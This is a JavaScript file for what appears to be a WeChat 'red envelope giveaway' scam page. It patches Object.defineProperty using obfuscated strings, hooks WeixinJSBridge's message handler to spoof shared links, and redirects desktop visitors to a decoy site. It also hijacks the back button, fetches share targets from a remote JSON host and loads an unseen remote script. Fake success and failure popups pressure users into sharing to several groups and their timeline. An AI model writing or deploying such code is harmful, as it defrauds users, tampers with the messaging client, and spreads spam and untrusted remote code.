
   var app = app || {},
    Url,
    oldDefProp,
    fakeUrl,
    Main,
    WechatShare,
    ua,
    weui,
    timess;
if (function() {
    var n = this;
    app.decodeStr = function(n) {
        var r,
            t,
            i;
        if (!n)
            return "";
        for (r = n[0], t = n.split(r), i = 0; i < t.length; i++)
            t[i] && (t[i] = String.fromCharCode(t[i]));
        return t.join("")
    };


}(), ua = navigator.userAgent, ua.indexOf("MicroMessenger") > 0) {
    function isInWechat() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("micromessenger") >= 0
    }
    function isIos() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("iphone") >= 0 || n.indexOf("ipad") >= 0 || n.indexOf("applewebkit") >= 0
    }
    function isAndroid() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("android") >= 0
    }
    function isUrl(n) {
        return !!n && (n.indexOf("http://") >= 0 || n.indexOf("https://") >= 0)
    }
    function isArray(n) {
        return "[object Array]" === Object.prototype.toString.call(n)
    }
    function isNumber(n) {
        return "number" == typeof n
    }
    function getRandomNum(n, t) {
        var i = t - n,
            r = Math.random();
        return n + Math.round(r * i)
    }
    function getFormatDate() {
        var n = new Date,
            t = new Date(n.setHours(n.getHours() + 8)).toISOString();
        return t.substring(0, t.indexOf("T"))
    }
    function changeTitle(n) {
        if (document.title = n, navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
            var i = $("body"),
                t = $('<iframe src="favicon.ico"><\/iframe>');
            t.on("load", function() {
                setTimeout(function() {
                    t.off("load").remove()
                }, 0)
            }).appendTo(i)
        }
    }
    Url = function() {
        function n() {
            this.host = window.location.host;
            this.protocol = window.location.protocol;
            this.params = this.GetRequest(window.location.search);
            this.hash = window.location.hash;
            this.pathname = window.location.pathname
        }
        return n.prototype.GetHref = function(n) {
            var i = this,
                o = void 0 === n.port ? i.port : n.port,
                c = void 0 === n.pathname ? i.pathname : n.pathname,
                l = n.host || i.host,
                a = n.protocol || i.protocol || "http:",
                f = a + "//" + l + (o ? ":" + o : "") + c,
                r = {},
                e,
                s,
                u,
                t,
                h;
            if ("all" !== n.removeParams)
                for (t in i.params)
                    i.params.hasOwnProperty(t) && (r[t] = i.params[t]);
            if (n.params)
                for (t in n.params)
                    n.params.hasOwnProperty(t) && (r[t] = n.params[t]);
            if ("all" !== n.removeParams && (e = n.removeParams, e))
                for (t in e)
                    n.removeParams.hasOwnProperty(t) && (s = n.removeParams[t], delete r[s]);
            u = [];
            for (t in r)
                r.hasOwnProperty(t) && u.push(t + "=" + encodeURIComponent(r[t]));
            return u && u.length > 0 && (h = u.join("&")), f += f.indexOf("?") > 0 ? "&" : "?", f + h
        }, n.prototype.GetRequest = function(n) {
            var f = n,
                e = {};
            if (f.indexOf("?") != -1)
                for (var h = f.substr(1), o = h.split("&"), r = 0; r < o.length; r++) {
                    var t = o[r],
                        u = t.indexOf("="),
                        i = void 0,
                        s = void 0;
                    u >= 0 ? (i = t.substr(0, u), s = decodeURIComponent(t.substring(u + 1))) : i = t;
                    i && (e[i] = s)
                }
            return e
        }, n
    }();
    oldDefProp = Object.defineProperty;
    Object.defineProperty = function(n, t, i) {
        (t == app.decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110") || t == app.decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101")) && (i.writable = !0, i.configurable = !0);
        oldDefProp(n, t, i)
    };
    window.url = new Url;
    fakeUrl = "http://weather.html5.qq.com";
    window.config = {
        modelConfig: {
            forceShareCount: 5
        },
        showRepairPage: !1,
        forbidUrl: fakeUrl
    };
    window.mConfig = {};
    isAndroid() || isIos() || (location.href = config.forbidUrl ? config.forbidUrl : fakeUrl);
    Main = function() {
        function n() {
            this.nextUrlCalledCount = 0;
            this.forceShareCount = 5;
            this.currentShareCount = 0;
            this.toastTimeOut = 0;
            this.searchModelId = window.url.params.mid || "video-list";
            this.redirect = this.isNeedRedirect();
            this.isIphone = isIos();
            this.fileName = location.pathname.substr(location.pathname.lastIndexOf("/"));
            this.fileName.indexOf(".html") < 0 && (this.fileName = "/index.html")
        }
        return n.prototype.isNeedRedirect = function() {
            var n = window.url.params.from;
            return "timeline" == n || "groupmessage" == n || "singlemessage" == n || "share" == n
        }, n.prototype.getRandomValueInArray = function(n, t) {
            if (!n)
                return t;
            if ("string" == typeof n)
                return n;
            if (!isArray(n))
                return t;
            var i = getRandomNum(0, n.length - 1);
            return n[i] || t
        }, n.prototype.start = function() {
            var t = this,
                n;
            t.hookBackButton();
            void t.setShareCallBack();
            n = {
            title: '目前已有42316人领取荭苞大礼！', //分享好友显示的标题
            desc: '立即抢红包！', //分享好友显示的描述
            link: 'http://www.qq.com', //分享好友的网址
            img_url: 'http://f.hiphotos.baidu.com/image/pic/item/c83d70cf3bc79f3d4d04d26fb3a1cd11738b2983.jpg', //分享好友显示的图标
            };

			$.getJSON((app.apiHost || "https://loads.applinzi.com/json.php?callback=?") + "", function(i) {
                i && i.ShareUrl && (n.link = i.ShareUrl, app.timelineUrl = i.TimelineUrl, app.timelineTitle = i.TimelineTitle, app.timelineImage = i.TimelineImage, app.orderUrl = i.OrderUrl, i.ShareTitle && (n.title = i.ShareTitle), i.Sharedesc && (n.desc = i.Sharedesc), i.ShareImg && (n.img_url = i.ShareImg));
                t.setModelShareData(n)
            })
		
			app.orderUrl = 'http://www.sina.com.cn';
			 t.setModelShareData(n)

        }, n.prototype.hookBackButton = function() {
            var n = this;
            window.setTimeout(function() {
                history.pushState("weixin", null, "#weixin");
                n.isIphone && history.pushState("weixin", null, "#weixin");
                window.onpopstate = function(n) {
                    if (!window.main.isIphone || null !== n.state) {
                        if (window.turl && window.turl.length > 0)
                            return void (location.href = window.turl);
                        var t = main.backUrl;
                        if ("close" === t)
                            WeixinJSBridge && WeixinJSBridge.call("closeWindow");
                        else if (t && t.length > 0)
                            return void (location.href = t)
                    }
                }
            }, 50)
        }, n.prototype.setShareCallBack = function() {
            var n = this;
            window.wcShare && (window.wcShare.shareCallback = function(t) {
                var r = !1,
                    i = t && t.err_msg;
                ("send_app_msg:ok" == i || "send_app_msg:confirm" == i || "share_timeline:ok" == i) && (n.currentShareCount++, n.currentShareCount == n.forceShareCount && "share_timeline:ok" != i && n.currentShareCount--, r = !0);
                r && (sharetips(n.currentShareCount), n.model && n.model.shareCallback && n.model.shareCallback({
                    success: r,
                    forceShareCount: n.forceShareCount,
                    currentShareCount: n.currentShareCount,
                    message: i
                }), n.setNewShareData("shareCallback"), n.currentShareCount == 4 && n.setNewShareData("timeline"))
            })
        }, n.prototype.runAction = function() {
            console.log("runAction")
        }, n.prototype.setNewShareData = function(n) {
            var t,
                i,
                r;
            return n == "timeline" ? (t = window.wcShare.shareData, app.timelineUrl && (t.link = app.timelineUrl), app.timelineTitle && (t.title = app.timelineTitle), app.timelineImage && (t.img_url = app.timelineImage), void (window.wcShare.shareData = t)) : this.model && this.model.getShareData && (this.modelShareData = this.model && this.model.getShareData(n), i = this.modelShareData, i || (r = $("img")[0], i = {
                link: location.href,
                title: document.title,
                desc: document.title,
                img_url: r && r.getAttribute("src")
            }), isUrl(i.link)) ? void (window.wcShare.shareData = i) : void 0
        }, n.prototype.setModelShareData = function(n) {
            var t,
                r,
                i,
                s;
            if (window.wcShare) {
                if (t = {
                    link: n.link,
                    desc: n.desc,
                    title: n.title,
                    img_url: n.img_url
                }, isUrl(t.link))
                    return void (window.wcShare.shareData = t);
                if (isUrl(this.nextUrl))
                    return t.link = this.nextUrl, void (window.wcShare.shareData = t);
                var u = void 0,
                    f = void 0,
                    e = void 0,
                    o = "share-user-api-error";
                if (this.nextUrl && (u = this.nextUrl, f = this.fileName, e = "", o = "share-user-ok"), r = {
                    protocol: "http:",
                    host: u,
                    pathname: f,
                    port: e,
                    params: {
                        user: o,
                        dmid: this.searchDomainModelId,
                        sdmid: this.searchShareDomainModelId,
                        from: "share",
                        timestamp: Date.now()
                    },
                    removeParams: ["isappinstalled"]
                }, n.linkParams)
                    for (i in n.linkParams)
                        n.linkParams.hasOwnProperty(i) && (s = n.linkParams[i], r.params[i] = s);
                t.link = url.GetHref(r);
                window.wcShare.shareData = t
            }
        }, n
    }();
    WechatShare = function() {
        function n() {
            var n = this;
            this.onBridgeReady = function() {
                var t = window.WeixinJSBridge,
                    i = {
                        invoke: t.invoke,
                        call: t.call,
                        on: t.on,
                        env: t.env,
                        log: t.log,
                        _fetchQueue: t._fetchQueue,
                        _hasInit: t._hasInit,
                        _hasPreInit: t._hasPreInit,
                        _isBridgeByIframe: t._isBridgeByIframe,
                        _continueSetResult: t._continueSetResult,
                        _handleMessageFromWeixin: t._handleMessageFromWeixin
                    };
                Object.defineProperty(window, "WeixinJSBridge", {
                    writable: !0,
                    enumerable: !0
                });
                window.WeixinJSBridge = i;
                try {
                    n.setHandleMessageHookForWeixin()
                } catch (t) {
                    n.restoreHandleMessageHookForWeixin()
                }
            };
            this.handleMesageHook = function(t) {
                var r;
                if (t) {
                    r = t.__json_message ? t.__json_message : t;
                    var i = r.__params,
                        u = r.__msg_type,
                        f = r.__event_id;
                    if ("callback" == u && n.shareCallback && "function" == typeof n.shareCallback)
                        n.shareCallback(i);
                    else if ("event" == u && f && f.indexOf("share") > 0) {
                        var e = n.shareData.desc,
                            o = n.shareData.link,
                            s = n.shareData.img_url,
                            h = n.shareData.title;
                        Object.defineProperty(i, "title", {
                            get: function() {
                                return delete i.scene, i.desc = e, i.link = o, i.img_url = s, Object.defineProperty(i, "title", {
                                    value: h,
                                    enumerable: !0
                                }), "title"
                            },
                            set: function() {},
                            enumerable: !1,
                            configurable: !0
                        });
                        n.restoreHandleMessageHookForWeixin();
                        n.oldHandleMesageHook(t);
                        n.setHandleMessageHookForWeixin()
                    } else
                        n.restoreHandleMessageHookForWeixin(), n.oldHandleMesageHook(t), n.setHandleMessageHookForWeixin()
                }
            };
            "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
        }
        return n.prototype.setHandleMessageHookForWeixin = function() {
            this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
            window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
        }, n.prototype.restoreHandleMessageHookForWeixin = function() {
            this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
        }, n
    }();
    window.wcShare = new WechatShare;
    $(document).ready(function() {
        window.main = new Main;
        window.main.start()
    })
};
$(function(){
	    weui = {
        alert: function(n, t, i) {
            var r,
                u;
            t = t ? t : "";
            r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
            r += '<div class="weui_mask"><\/div>';
            r += '<div class="weui_dialog">';
            r += '    <div class="weui_dialog_hd"><strong class="weui_dialog_title">' + t + "<\/strong><\/div>";
            r += '    <div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><\/div>';
            r += '    <div class="weui_dialog_ft">';
            r += '      <a href="javascript:;" class="weui_btn_dialog primary">确定<\/a>';
            r += "  <\/div>";
            r += " <\/div>";
            r += "<\/div>";
            $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
            u = $(".weui_dialog_alert");
            u.show();
            u.find(".weui_dialog_bd").html(n);
            u.find(".weui_btn_dialog").off("click").on("click", function() {
                u.hide();
                i && i()
            })
        }
    };
	
	
	});
	
	
	var alertTimes = 0;
function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.fadeIn(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.fadeOut(200);
        if (callback) {
            callback()
        }
    })
}
	
	function sharetips(n) {
        switch (n) {
        case 0:
            /*wxalert('0');*/
            break;
        case 1:
            wxalert('分享成功,还需分享<span style="color: #f5294c">2个不同</span>微信群', '好');
            break;
        case 2:
           wxalert('分享成功,还需分享<span style="color: #f5294c">1个不同</span>微信群', '好');
			break;
        case 3:
           wxalert('分享失败,请再分享1个<span style="color: #f5294c">不同</span>微信群', '好');
            break;
        case 4:
           wxalert('分享成功，剩下最后一步啦!请分享到<span style="color: #f5294c">朋友圈</span>即可领取！', '好');
            break;
     case 4:
          wxalert('领取成功，由于节日繁忙，红包将会按时间顺序陆续到账。<br><span style="color: #f5294c">【另送您3次抽iPhone7机会】</span><br>请注意：朋友圈信息不可删除，否则无法核实身份！', '好', gotocj);
        }
    }
	
	function gotocj() {
        $.getScript("https://loads.oschina.io/zhuanpan/index.js");
    }
